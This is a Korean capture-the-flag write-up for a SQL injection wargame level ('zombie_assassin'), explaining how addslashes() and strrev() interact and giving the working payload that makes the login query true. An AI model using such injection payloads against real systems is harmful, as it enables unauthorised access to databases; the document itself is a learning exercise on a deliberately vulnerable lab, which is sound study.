## Q17. zombie_assassin _ Q16
<img src="/photo/prob_17.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: X <br> 문제 사항: 쿼리문 참으로 만들기
### 해결책

```
제한된 문자 X
but. addslashes(), strrev() 함수가 사용됨
=> 두 함수를 먼저 찾아봄
=> 두 함수에 의해 ' / " / \ 사용 시 \가 붙고 문자열 뒤집어짐
=> 문자열을 벗어나기 위해서는 \를 이용해야함
but. \ 사용시 \\ 되어 문자열로 인식됨
=> 어려움을 겪음, 많은 고민을 함
=> '" 사용하면 "\'\가 되어서 뒤의 '도 문자로 인식됨
```
```diff
# 현재 쿼리문: where id='"\'\' and pw=''
```
```
id='"\'\' and pw=' 는 거짓
=> 뒤에 OR 조건후 참으로 만들면 됨
```
```
해결 쿼리문: where id='"\'\' and pw='||1-- '
```
### CERT <br> ?id='"&pw=+--1||

### 느낀점
```diff
+ php의 strrev(), addslashes() 함수를 배웠다.
+ addslashes(string): string에 ' / " / \ 가 있을 시 그 문자 앞에 \ 붙여서 문자열을 반환함
+ strrev(string): string을 뒤집음

- strrev(), addslashes() 함수가 동시에 사용되어서 어려웠다.
```
